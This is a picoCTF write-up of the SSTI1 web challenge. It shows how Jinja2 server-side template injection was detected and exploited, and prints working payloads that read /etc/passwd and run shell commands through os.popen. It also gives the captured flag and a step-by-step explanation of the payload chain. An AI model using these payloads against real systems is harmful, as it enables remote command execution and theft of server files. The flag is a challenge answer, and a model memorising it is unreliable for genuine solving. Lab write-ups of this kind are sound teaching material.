🔖 Challenge Info

    Challenge Name: SSTI1

    Category: Web Exploitation

    CTF Platform: picoCTF

    Date Solved: 2025-05-02

📜 Challenge Description

    I made a cool website where you can announce whatever you want! Try it out!
    Additional details will be available after launching your challenge instance.

🧪 Recon & Enumeration

    I started by inspecting the webpage, but I didn’t find anything useful at first glance.

    I checked the provided hint, which stated:

        “Server Side Template Injection”

    I paused for around 1–2 hours to study SSTI (Server-Side Template Injection) and how to detect and exploit it.

To test for SSTI, I used the following payload:

{{7*7}}

When I submitted it in the input field, the output was:

49

This confirmed the presence of SSTI.
🧨 Vulnerability Identified

    Vulnerability: Server-Side Template Injection

    Template Engine: Likely Jinja2 (based on the payload behavior)

💣 Exploitation Steps

    I researched common SSTI payloads for Jinja2.

    I found this payload, which tries to read the /etc/passwd file:

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

However, this didn't work in my case, so I looked for simpler payloads.

I used this payload to execute the ls command:

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

This returned:

__pycache__ app.py flag requirements.txt

Then, I used the cat command to read the flag:

{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

Output:

    picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}

🏁 Flag

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}

Note : 

Step-by-Step Breakdown
1. config

    In Flask apps, config is often available in the template context.

    It’s an instance of the Config class, which holds configuration values.

2. config.__class__

    Accesses the class of the config object: <class 'flask.config.Config'>.

3. __init__

    Gets the __init__ method of the class, which is the constructor function.

4. __globals__

    Every Python function has a __globals__ attribute: a dictionary of all the global variables/modules accessible in that function.

    Since __init__ is a method, you can use it to access the global scope of the module where flask.config.Config is defined — including the os module if it was imported there.

5. ['os']

    Retrieves the os module from the __globals__ dictionary.

6. .popen('ls')

    Uses os.popen() to run the shell command ls (list directory contents).

    This returns a file-like object.

7. .read()

    Reads the output of the ls command from the file-like object.

8. {{ ... }}

    Jinja2 syntax to evaluate the expression and display the result in the HTML output.